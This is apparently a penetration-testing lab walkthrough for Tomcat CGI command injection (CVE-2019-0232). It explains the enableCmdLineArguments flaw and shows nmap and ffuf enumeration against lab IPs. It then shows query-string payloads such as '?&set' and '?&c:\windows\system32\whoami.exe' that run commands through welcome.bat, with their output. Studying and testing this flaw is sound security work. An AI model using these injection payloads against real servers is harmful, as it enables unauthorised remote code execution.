# Attacking Tomcat CGI

CVE-2019-0232 is a critical security issue that could result in remote code execution. 
This vulnerability affects Windows systems that have the enableCmdLineArguments feature enabled. 

Versions 9.0.0.M1 to 9.0.17, 8.5.0 to 8.5.39, and 7.0.0 to 7.0.93 of Tomcat are affected

The CGI Servlet is a vital component of Apache Tomcat that enables web servers to communicate with external applications beyond the Tomcat JVM.

In essence, a CGI Servlet is a program that runs on a web server, such as Apache2, to support the execution of external applications that conform to the CGI specification. It is a middleware between web servers and external information resources like databases.

The enableCmdLineArguments setting for Apache Tomcat's CGI Servlet controls whether command line arguments are created from the query string.
If set to true, the CGI Servlet parses the query string and passes it to the CGI script as arguments.

Examples :
http://example.com/cgi-bin/booksearch.cgi?action=title&query=the+great+gatsby
http://example.com/cgi-bin/booksearch.cgi?action=author&query=fitzgerald

On Windows systems because the CGI Servlet fails to properly validate the input from the web browser before passing it to the CGI script :

http://example.com/cgi-bin/hello.bat?&dir

## Enumeration

nmap -p- -sC -Pn 10.129.204.227 --open 

8080/tcp  open  http-proxy
|_http-title: Apache Tomcat/9.0.17
|_http-favicon: Apache Tomcat
47001/tcp open  winrm

## Finding a CGI script

### Fuzzing Extentions - .CMD

ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd

### Fuzzing Extentions - .BAT

ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat

[Status: 200, Size: 81, Words: 14, Lines: 2, Duration: 234ms]
    * FUZZ: welcome


http://10.129.204.227:8080/cgi/welcome.bat
Welcome to CGI, this section is not functional yet. Please return to home page.


## Exploitation

http://10.129.204.227:8080/cgi/welcome.bat?&dir

If whoami does not work, use &set command to check the PATH variable :

http://10.129.204.227:8080/cgi/welcome.bat?&set

Welcome to CGI, this section is not functional yet. Please return to home page.
AUTH_TYPE=
COMSPEC=C:\Windows\system32\cmd.exe
CONTENT_LENGTH=
CONTENT_TYPE=
GATEWAY_INTERFACE=CGI/1.1
HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
HTTP_ACCEPT_ENCODING=gzip, deflate
HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5
HTTP_HOST=10.129.204.227:8080
HTTP_USER_AGENT=Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.JS;.WS;.MSC
PATH_INFO=

PTH variable is unset so :

http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe

## LAB

nmap -p- -sC -Pn 10.129.205.30 --open 

8080/tcp  open  http-proxy
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.17



ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.205.30:8080/cgi/FUZZ.bat

welcome                 [Status: 200, Size: 81, Words: 14, Lines: 2, Duration: 150ms]


http://10.129.205.30:8080/cgi/welcome.bat

Welcome to CGI, this section is not functional yet. Please return to home page.

http://10.129.48.108:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe


http://10.129.48.108:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe

feldspar\omen

